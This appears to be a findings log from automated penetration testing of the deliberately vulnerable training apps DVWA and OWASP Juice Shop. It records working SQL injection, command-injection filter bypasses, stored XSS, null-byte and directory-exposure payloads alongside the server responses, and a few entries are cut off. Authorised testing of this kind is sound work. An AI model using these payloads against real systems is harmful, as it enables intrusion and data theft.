[security=high] Form unchanged structurally from low/medium: single text field 'ip' + submit button 'Submit', action=/vulnerabilities/exec/. Per challenge spec, high-security blacklist strips '; ', '| ' (pipe+space) and '&&', requiring a pipe with no trailing space e.g. 127.0.0.1|whoami to bypass.

[security=medium] Form unchanged from low: txtName maxlength=10, mtxMessage textarea maxlength=50, submit buttons btnSign/btnClear, action=/vulnerabilities/xss_s/. Per DVWA medium-level source, mtxMessage is NOT filtered (only txtName is passed through htmlspecialchars), so stored <script> payloads in mtxMessage are still expected to execute unescaped (not yet submitted/verified here - mapping only). status=pending_verification

findings.title: SQL Injection in DVWA SQLi page (id parameter) - low security
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 full user records (First name/Surname pairs): admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload id=1' AND '1'='2 returned zero records (page shows only 'User ID:' with no First name/Surname rows). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based injection that alters result set cardinality.

findings.title: OS Command Injection in DVWA Command Injection page (ip parameter) - low security
findings.response_evidence: [security=low] Response output included standard ping results for 127.0.0.1 (4 packets transmitted, 0% packet loss) followed immediately by the injected command's output 'www-data' on its own line at the end of the <pre> block, confirming the unsanitized 'ip' field allows arbitrary OS command execution chained via ';' and that the web server process runs as the 'www-data' user.

findings.title: Stored XSS in DVWA Guestbook (mtxMessage field) - low security
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'test', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin) -- note: client-side maxlength=50 was bypassed via direct POST since the 51-char payload exceeds maxlength but is enfo
findings.response_evidence: [security=low] After submitting the payload, the guestbook page no longer rendered the message as visible text (script content is non-visible), but on re-navigation the injected <script id=\"test_token\"> tag was present and executed in the page DOM.
findings.browser_js_evidence: browser_eval_js(\"window.xss_flag\") returned 1. browser_read_dom(\"#test_token\") returned inner_text/inner_html \"window.xss_flag=1\", confirming the injected <script id=\"test_token\"> tag was stored and executed as live JavaScript in the authenticated admin browser context when loading /vulnerabilities/xss_s/, proving persistent/stored XSS.

findings.title: SQL Injection via numeric boolean payload in SQLi form (medium security)
request_sequence: POST http://dvwa/security.php  body=security=medium&seclev_submit=Submit&user_token=[REDACTED]  (set security level to medium)
findings.response_evidence: [security=medium] Page footer confirms 'Security Level: medium' and banner text 'Security level set to medium'. TRUE payload id=1 OR 1=1 returned 5 full user records (First name/Surname pairs): admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith — i.e. the entire users table dumped via boolean-always-true injection. FALSE payload id=1 AND 1=2 returned zero records (only the empty User ID selector form, no 'First name'/'Surname' rows at all). This differential behavior (multiple surnames for TRUE vs zero rows for FALSE) with an unquoted numeric boolean payload (required because medium-level code applies mysqli_real_escape_string to the quote-protected version but does not parameterize/sanitize against unquoted numeric injection) confirms server-side SQL injection in the POST id parameter at medium security.

findings.title: OS Command Injection via pipe bypass in Command Injection (ping) form (medium security)
request_sequence: POST http://dvwa/security.php  body=security=medium&seclev_submit=Submit&user_token=[REDACTED]  (set security level to medium)
findings.response_evidence: [security=medium] Page footer confirms 'Security Level: medium'. Submitting ip=127.0.0.1| whoami (pipe character, which bypasses the medium-level blacklist that only filters literal ';' and '&&' substrings) produced a response whose output block (<pre>) contained exactly 'www-data' — the web server process identity — appended after the (suppressed/empty) ping output, confirming the injected whoami command executed server-side on the medium security level.

findings.title: Broken Object Level Authorization (BOLA) on /rest/basket/{id} allows cross-user basket disclosure
findings.response_evidence: HTTP 200 response to acct2's request for basket id=6 (NOT acct2's own basket, which is id=7) returned: {\"status\":\"success\",\"data\":{\"id\":6,\"coupon\":null,\"UserId\":22,...,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3,...}}]}}. This discloses UserId=22's (account1's) basket contents including seeded product 'Apple Juice (1000ml)' and quantity to a different authenticated user (acct2, own_basket_id=7) with no authorization check preventing access to another user's basket by ID. The server never validated that the requesting session's user owns basket 6, confirming CWE-639 BOLA.

findings.title: SQL Injection authentication bypass on /rest/user/login via crafted email field
findings.response_evidence: HTTP 200 response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email value `' OR 1=1--` comments out the password check in the backend SQL query, causing the login logic to match the first row returned by the users table (umail=admin@juice-sh.op, the first/admin user), and a valid authentication JWT token was issued for that account despite supplying an arbitrary password. This confirms a classic SQLi authentication bypass (CWE-89) returning a valid token for the first user without knowing credentials.

findings.title: SQL Injection in product search 'q' parameter (error-based and UNION-based)
findings.response_evidence: 1) q=qwert' returned HTTP 500 with body containing: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" — proving the raw input is concatenated unsanitized into a backend SQL query, causing a syntax error (confirms injection point). 2) q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}. The returned record's fields are literally the integer constants 1-9 supplied in the UNION SELECT (name=2, description=3, price=4, etc.), proving the attacker-controlled UNION query was executed by the backend and its result set returned directly to the client. This confirms exploitable SQL injection (CWE-89) via the q parameter.

findings.title: Open Directory Listing Exposes Confidential Acquisitions Memo
findings.response_evidence:
Step1: GET /ftp/ returned HTTP 200 with serve-index directory listing explicitly enumerating 'acquisitions.md 909' bytes alongside other files (announcement_encrypted.md, coupons_2013.md.bak, legal.md, package.json.bak, etc.) — confirming an open directory listing without authentication.
Step2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body beginning: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' — this is the verbatim confidential acquisition memo text, proving both the directory listing exposure and successful retrieval of the sensitive document without authentication.

findings.title: Unauthenticated Access to User Feedback Discloses PII (Email Addresses)
request_sequence: GET http://juiceshop:3000/api/Feedbacks HTTP/1.1 (unauth session, no Authorization header/cookie sent)
findings.response_evidence: Request made with the 'unauth' session (no auth token) returned HTTP 200 with JSON body: {\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",...},{\"UserId\":2,...,\"comment\":\"Great shop! Awesome service! (***@juice-sh.op)\"},{\"UserId\":3,...,\"comment\":\"Nothing useful available here! (***der@juice-sh.op)\"},{\"UserId\":21,...,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : ... (***ereum@juice-sh.op)\"}, ...]}. The endpoint is fully unauthenticated yet discloses feedback records tied to UserId values along with partial email-address fragments embedded in comment text (PII), and overall record structure (UserId linkage) that an authenticated-only endpoint should protect. This confirms unauthenticated PII exposure per CWE-359.

findings.title: Poison Null-Byte Extension Filter Bypass Grants Access to Restricted .bak File
findings.response_evidence:
Step1 (baseline): GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' and stack trace referencing fileServer.js verify() extension filter — confirms the .bak extension is blocked by the server-side filter.
Step2 (bypass): GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decodes to %00 + '.md') returned HTTP 200, content-type application/octet-stream, with full package.json file content: '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {...}, \"devDependencies\": {...}}'. The filter saw the appended .md extension and allowed the request, while the underlying filesystem read truncated the path at the null byte, serving the restricted package.json.bak file. This behavioral contrast (403 vs 200-with-real-restricted-content) confirms the poison null-byte path traversal/extension-filter bypass.

findings.title: Exposed Encryption-Keys Directory Listing at /encryptionkeys/
findings.response_evidence: HTTP 200 response from unauthenticated GET /encryptionkeys/ rendered a serve-index style directory listing. Extracted visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. The listing exposes direct links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, both sensitive cryptographic key material files, confirming the directory is browsable and discloses sensitive key files without authentication, matching the CWE-548 criteria (browsable listing + exposure of premium.key and jwt.pub).

findings.title: OS Command Injection via ip parameter on /vulnerabilities/exec/ (DVWA high security, pipe bypass)
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed page footer shows Security Level: high
findings.response_evidence:
[security=high] Confirmed OS command injection at DVWA high security level. Page footer explicitly confirms "Security Level: high" and "Username: admin" for this session.

Payload ip=127.0.0.1|whoami (pipe with no surrounding spaces, bypassing the high-security blacklist of '; ', '| ' with trailing space, and '&&') was submitted to POST /vulnerabilities/exec/.

Response pre-block output: "www-data" -- i.e. the rendered result area showed:

This is the literal output of the injected `whoami` command executed by the web server process (www-data), appended after the ping output, proving successful command injection distinct from the low (`;`) and medium (`127.0.0.1| whoami` with space / blacklist of `;` and `&&`) bypass techniques which are blocked at this high level.
